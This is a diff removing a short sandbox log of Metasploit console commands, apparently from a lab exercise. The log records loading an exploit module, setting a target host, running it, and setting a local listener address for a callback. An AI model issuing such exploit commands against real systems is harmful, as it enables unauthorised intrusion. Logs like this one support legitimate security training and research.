@@ -1,7 +1,0 @@
-{"sandbox_id": "28", "timestamp_str": "2021-04-22T14:44:01.110Z", "cmd_type": "msf-command", "cmd": "use exploit/47230"}
-{"sandbox_id": "28", "timestamp_str": "2021-04-22T14:44:10.287Z", "cmd_type": "msf-command", "cmd": "show options"}
-{"sandbox_id": "28", "timestamp_str": "2021-04-22T14:44:59.143Z", "cmd_type": "msf-command", "cmd": "set rhosts 172.18.1.5"}
-{"sandbox_id": "28", "timestamp_str": "2021-04-22T14:45:03.294Z", "cmd_type": "msf-command", "cmd": "show options"}
-{"sandbox_id": "28", "timestamp_str": "2021-04-22T14:45:23.454Z", "cmd_type": "msf-command", "cmd": "run"}
-{"sandbox_id": "28", "timestamp_str": "2021-04-22T14:45:35.170Z", "cmd_type": "msf-command", "cmd": "show options"}
-{"sandbox_id": "28", "timestamp_str": "2021-04-22T14:46:46.344Z", "cmd_type": "msf-command", "cmd": "set lhost 10.1.135.83"}
